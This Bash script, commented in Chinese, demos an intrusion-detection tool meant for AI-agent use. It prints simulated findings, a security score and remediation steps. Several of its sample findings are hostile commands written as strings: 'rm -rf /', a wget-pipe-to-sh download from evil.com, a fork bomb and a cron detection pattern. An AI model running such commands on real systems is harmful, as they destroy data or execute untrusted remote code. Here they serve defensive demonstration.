#!/bin/bash

# 入侵检测工具演示脚本
# 用于展示 detect_intrusion 工具的功能

set -e

echo "======================================"
echo "入侵检测工具功能演示"
echo "======================================"
echo ""

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 模拟检测函数
demo_detection() {
    local category=$1
    local level=$2
    local item=$3
    local detail=$4

    case $level in
        "critical")
            echo -e "${RED}[CRITICAL]${NC} $item"
            ;;
        "high")
            echo -e "${RED}[HIGH]${NC} $item"
            ;;
        "medium")
            echo -e "${YELLOW}[MEDIUM]${NC} $item"
            ;;
        *)
            echo -e "[INFO] $item"
            ;;
    esac

    echo "  详情: $detail"
    echo ""
}

echo "1. 登录审计演示"
echo "--------------------------------------"
demo_detection "login" "high" "暴力破解尝试" "IP 192.168.1.50 失败 25 次"
demo_detection "login" "medium" "异常时间登录" "用户 admin 在凌晨 03:15 登录"
demo_detection "login" "high" "root 用户登录" "root 从 192.168.1.100 登录"

echo "2. 命令审计演示"
echo "--------------------------------------"
demo_detection "command" "critical" "危险命令执行" "发现匹配: rm -rf /"
demo_detection "command" "critical" "可疑脚本下载执行" "wget http://evil.com/shell.sh | sh"
demo_detection "command" "critical" "Fork Bomb 检测" "发现: :(){:|:&};:"

echo "3. 文件完整性检查演示"
echo "--------------------------------------"
demo_detection "file" "critical" "异常 SUID 文件" "/bin/bash 具有 SUID 位"
demo_detection "file" "high" "临时目录有可执行文件" "/tmp/.evil/shell 可执行"
demo_detection "file" "medium" "配置文件最近修改" "/etc/ssh/sshd_config 在 1 小时前修改"

echo "4. 后门检测演示"
echo "--------------------------------------"
demo_detection "backdoor" "high" "异常端口监听" "端口 4444 正在监听"
demo_detection "backdoor" "critical" "可疑定时任务" "匹配模式: wget.*\\|.*sh"
demo_detection "backdoor" "critical" "可疑自启动服务" "发现 kdevtmpfsi 相关服务"

echo "5. 挖矿病毒检测演示"
echo "--------------------------------------"
demo_detection "miner" "critical" "挖矿进程" "发现 xmrig 进程 (PID: 12345)"
demo_detection "miner" "high" "可疑高CPU进程" "进程 unknown (CPU: 95%, 内存: 2%)"

echo "======================================"
echo "安全评分计算演示"
echo "======================================"
echo ""

# 计算安全评分
SCORE=100
echo "初始分数: 100"
echo ""

# 减分项
echo "Critical 级别 (-25):"
echo "  - 危险命令执行"
echo "  - 可疑脚本下载"
echo "  - Fork Bomb"
echo "  - 异常 SUID 文件"
echo "  - 挖矿进程"
echo "  (5 × -25 = -125)"
echo ""

echo "High 级别 (-10):"
echo "  - 暴力破解尝试"
echo "  - root 登录"
echo "  - 临时目录可执行文件"
echo "  - 异常端口监听"
echo "  - 可疑高CPU进程"
echo "  (5 × -10 = -50)"
echo ""

echo "Medium 级别 (-5):"
echo "  - 异常时间登录"
echo "  - 配置文件修改"
echo "  (2 × -5 = -10)"
echo ""

TOTAL_MINUS=$((125 + 50 + 10))
FINAL_SCORE=$((SCORE - TOTAL_MINUS))
if [ $FINAL_SCORE -lt 0 ]; then
    FINAL_SCORE=0
fi

echo "总分: 100 - 185 = 0 (最低 0 分)"
echo -e "${RED}安全评分: 0/100 (危险)${NC}"
echo ""

echo "======================================"
echo "安全摘要"
echo "======================================"
echo "安全审计发现以下问题："
echo "- critical级: 5 项"
echo "- high级: 5 项"
echo "- medium级: 2 项"
echo ""
echo "建议立即进行安全加固！"
echo ""

echo "======================================"
echo "快速处置命令"
echo "======================================"
echo ""
echo "1. 终止挖矿进程:"
echo "   killall -9 xmrig"
echo ""
echo "2. 删除恶意文件:"
echo "   rm -f /tmp/.evil/shell"
echo ""
echo "3. 移除异常 SUID:"
echo "   chmod -s /bin/bash"
echo ""
echo "4. 封禁攻击 IP:"
echo "   iptables -A INPUT -s 192.168.1.50 -j DROP"
echo ""
echo "5. 禁用恶意服务:"
echo "   systemctl stop kdevtmpfsi"
echo "   systemctl disable kdevtmpfsi"
echo ""
echo "6. 删除可疑定时任务:"
echo "   crontab -e  # 删除恶意行"
echo ""

echo "======================================"
echo "安全加固建议"
echo "======================================"
echo ""
echo "立即执行："
echo "1. 隔离主机（断网）"
echo "2. 修改所有密码"
echo "3. 全面审计系统"
echo "4. 检查其他主机"
echo ""
echo "后续加固："
echo "1. 禁用 root 远程登录"
echo "2. 安装 fail2ban"
echo "3. 配置防火墙"
echo "4. 启用审计日志"
echo "5. 定期更新系统"
echo ""

echo "======================================"
echo "演示完成"
echo "======================================"
echo ""
echo "通过 AI Agent 使用："
echo "  agent.ExecuteTool(\"detect_intrusion\", map[string]interface{}{"
echo "      \"host\": \"your-host-ip\","
echo "  })"
echo ""
